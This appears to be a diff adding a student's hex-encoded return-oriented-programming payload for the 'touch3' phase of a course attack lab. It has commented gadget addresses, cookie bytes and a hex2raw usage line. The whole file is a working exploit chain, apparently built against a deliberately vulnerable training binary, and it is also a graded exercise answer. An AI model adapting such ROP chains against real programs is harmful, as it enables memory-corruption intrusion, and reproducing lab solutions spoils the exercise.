@@ -1,0 +1,70 @@
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+ad 1a 40 00 00 00 00 00 /* mov rsp, rax */
+a2 19 40 00 00 00 00 00 /* move rax to rdi */
+
+
+ab 19 40 00 00 00 00 00 /* pop */
+35 39 62 39 00 00 00 00 /* 0..3 */
+72 1a 40 00 00 00 00 00 /* xchg ecx , eax */
+ab 19 40 00 00 00 00 00 /* pop */
+00 10 00 00 00 00 00 00 /* str offset , up to here, expected */
+72 1a 40 00 00 00 00 00 /* xchg eax, ecx */
+63 1a 40 00 00 00 00 00 /* xchg ecx, esi, it also xchg rdx with rax, so we have to change back */
+65 1a 40 00 00 00 00 00
+72 1a 40 00 00 00 00 00 /* xchg eax, ecx, not as expected!! */
+d6 19 40 00 00 00 00 00 /* lea    (%rdi,%rsi,1),%rax, get true address */
+84 1a 40 00 00 00 00 00 /* write */
+
+ab 19 40 00 00 00 00 00 /* pop */
+39 37 66 61 00 00 00 00 /* 4..7 */
+72 1a 40 00 00 00 00 00 /* xchg  ecx , eax */
+ab 19 40 00 00 00 00 00 /* pop */
+04 10 00 00 00 00 00 00 /* str offset */
+72 1a 40 00 00 00 00 00 /* xchg eax, ecx */
+63 1a 40 00 00 00 00 00 /* xchg ecx, esi */
+65 1a 40 00 00 00 00 00
+72 1a 40 00 00 00 00 00 /* xchg eax, ecx, not as expected!! */
+d6 19 40 00 00 00 00 00 /* lea    (%rdi,%rsi,1),%rax, get true address */
+84 1a 40 00 00 00 00 00 /* write */
+
+ab 19 40 00 00 00 00 00 /* pop */
+00 00 00 00 00 00 00 00 /* 8 = end */
+72 1a 40 00 00 00 00 00 /* xchg */
+ab 19 40 00 00 00 00 00 /* pop */
+08 10 00 00 00 00 00 00 /* str offset */
+72 1a 40 00 00 00 00 00 /* xchg eax, ecx */
+63 1a 40 00 00 00 00 00 /* xchg ecx, esi */
+65 1a 40 00 00 00 00 00
+72 1a 40 00 00 00 00 00 /* xchg eax, ecx, not as expected!! */
+d6 19 40 00 00 00 00 00 /* lea    (%rdi,%rsi,1),%rax, get true address */
+84 1a 40 00 00 00 00 00 /* write */
+
+ab 19 40 00 00 00 00 00 /* pop */
+00 10 00 00 00 00 00 00 /* str offset */
+72 1a 40 00 00 00 00 00 /* xchg eax, ecx */
+63 1a 40 00 00 00 00 00 /* xchg ecx, esi */
+d6 19 40 00 00 00 00 00 /* lea    (%rdi,%rsi,1),%rax, get true address */
+a2 19 40 00 00 00 00 00 /* move rax to rdi; si 17 after it; this part seems to work */
+
+fa 18 40 00 00 00 00 00 /* touch 3 */
+
+/*
+./hex2raw < rin3.txt > rin3
+strategy:
+
+pop
+xchg
+pop
+write
+pop
+xchg
+pop
+write
+pop
+xchg
+pop
+write
+mov to rdi
+*/
